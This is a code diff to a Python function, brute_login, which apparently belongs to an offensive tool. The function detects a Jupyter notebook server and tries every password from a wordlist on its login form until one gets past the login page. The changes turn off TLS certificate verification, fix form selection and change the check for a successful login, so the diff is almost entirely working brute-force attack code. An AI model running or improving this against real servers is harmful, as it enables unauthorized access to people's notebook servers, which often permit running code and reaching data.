@@ -64,7 +64,7 @@ def brute_login(ip, port, pass_file, sleep_s):
 		url = ('https://' + ip + ':' + str(port))
 		print("...Trying HTTPS", url)
 		try:
-			browser.open(url, timeout=10)
+			browser.open(url, timeout=10, verify=False)
 		except:
 			status = "...Failed to open url " + url
 			return(status)
@@ -73,16 +73,15 @@ def brute_login(ip, port, pass_file, sleep_s):
 	if re.search('Jupyter', check_for_jupyter):
 	
 		if re.search('/login', browser.get_url()): # Testing to see if we are prompted for login
-			formURI = browser.get_url().split("/")[3] # Future use maybe?
 			passwords=open(pass_file, "r")
 			pass_line = passwords.readlines()
 			for password in pass_line:
 
-				browser.select_form() # sometimes this crashes, dont know why
+				browser.select_form(selector='form',nr=0) # sometimes this crashes, dont know why
 				browser['password'] = password
 				browser.submit_selected()
 				
-				if re.search('/tree', browser.get_url()): # Testing to see if we are prompted for login
+				if not re.search('/login', browser.get_url()): # Testing to see if we are prompted for login
 					# print(browser.get_url())
 					p = "...Password Found -> " + password
 					return(colored(p, 'cyan'))
